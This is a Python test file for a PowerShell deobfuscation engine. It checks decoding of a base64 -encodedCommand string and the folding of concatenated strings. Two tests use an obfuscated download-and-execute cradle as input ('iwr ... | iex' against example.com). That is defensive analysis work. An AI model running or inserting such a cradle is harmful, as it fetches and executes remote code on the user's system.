"""
M6 · Canonical Candidate Selector — integration tests.

Verifies:
  * ``convergence_decode`` returns a decode-shaped envelope for
    inputs the engine can canonically resolve.
  * Returns ``None`` (fallthrough) when the engine cannot make
    progress — legacy pipeline stays authoritative for un-modelled
    cases.
  * S001 · owner permanent anchor · **always** flows through the
    engine path. This is the regression floor the M6 architecture
    was designed to enforce.
  * The certificate fingerprint is hash-stable across repeated
    invocations of ``deterministic_best_decode`` for the same input
    (M7 API-exposure precondition).
  * When the selector fires, the ``engine`` field is ``"convergence"``
    (never ``"smart"`` or ``"magic"``).
"""
from __future__ import annotations

from workspace.convergence.selector import convergence_decode


def test_selector_returns_envelope_for_s001() -> None:
    payload = (
        "powershell.exe -encod "
        "VwByAGkAdABlAC0ASABvAHMAdAAgACIAdAB3AGUAZQB0ACwAIAB0AHcAZQBlAHQAIQAiAA=="
    )
    envelope = convergence_decode(payload)
    assert envelope is not None
    assert envelope["engine"] == "convergence"
    assert envelope["output"] == 'Write-Host "tweet, tweet!"'
    assert "convergence_certificate" in envelope
    assert envelope["convergence_certificate"]["canonical_state"] is True
    assert envelope["convergence_certificate"]["ready_for_behavioral_analysis"] is True
    assert len(envelope["certificate_fingerprint"]) == 64  # SHA-256 hex


def test_selector_step_records_present() -> None:
    payload = "'ht'+'tp'+'://ex'+'ample.com/x'"
    envelope = convergence_decode(payload)
    assert envelope is not None
    assert envelope["engine"] == "convergence"
    # At least one structural-string-concat-fold step must appear.
    op_names = {s["op"] for s in envelope["steps"]}
    assert "structural-string-concat-fold" in op_names


def test_selector_returns_none_for_already_canonical() -> None:
    """S012 · already canonical PowerShell — engine has nothing to do.
    Selector returns None so the caller falls back to legacy analysis."""
    payload = 'Write-Host "tweet, tweet!"'
    envelope = convergence_decode(payload)
    assert envelope is None


def test_selector_returns_none_for_empty_or_none() -> None:
    assert convergence_decode("") is None
    assert convergence_decode(None) is None  # type: ignore[arg-type]


def test_selector_fingerprint_stable_across_runs() -> None:
    """The certificate fingerprint MUST be identical for identical
    inputs — this is what makes the M6 selection deterministic and
    hash-stable in CI regression gates."""
    payload = "$a='ht'+'tp'+'://ex'+'ample.com/x'; iwr $a -useb | iex"
    fps = {convergence_decode(payload)["certificate_fingerprint"] for _ in range(3)}
    assert len(fps) == 1


def test_deterministic_best_decode_uses_convergence_for_s001() -> None:
    """The critical integration test: `deterministic_best_decode`
    (the entry point wired to `/api/decode/smart`) MUST route S001
    through the Convergence Engine — never through the legacy
    winner-picker that originally caused the regression."""
    from analysis_core import deterministic_best_decode
    payload = (
        "powershell.exe -encod "
        "VwByAGkAdABlAC0ASABvAHMAdAAgACIAdAB3AGUAZQB0ACwAIAB0AHcAZQBlAHQAIQAiAA=="
    )
    result = deterministic_best_decode(payload)
    assert isinstance(result, dict)
    assert result.get("engine") == "convergence", (
        f"S001 must be handled by the Convergence Engine · got engine={result.get('engine')!r}"
    )
    assert result["output"] == 'Write-Host "tweet, tweet!"'


def test_deterministic_best_decode_uses_convergence_for_s04() -> None:
    """S04 · alias-heavy PowerShell — the payload that exercises M2
    concat fold + M5 variable propagation + M5 alias expand. Must
    flow through the Convergence Engine end-to-end."""
    from analysis_core import deterministic_best_decode
    payload = "$a='ht'+'tp'+'://ex'+'ample.com/x'; iwr $a -useb | iex"
    result = deterministic_best_decode(payload)
    assert result.get("engine") == "convergence"
    out = result["output"]
    assert "Invoke-WebRequest" in out
    assert "Invoke-Expression" in out
    assert "'http://example.com/x'" in out


def test_deterministic_best_decode_falls_back_for_untouched_input() -> None:
    """For an already-canonical / engine-untouched payload the
    selector must return None so legacy paths take over. This proves
    the M6 integration is strictly additive."""
    from analysis_core import deterministic_best_decode
    payload = 'Write-Host "tweet, tweet!"'
    result = deterministic_best_decode(payload)
    # Whatever engine ultimately handles the plain string, it must NOT
    # be "convergence" (the Engine has no work to do here) — that's
    # exactly the fallthrough M6 guarantees.
    assert result.get("engine") != "convergence"
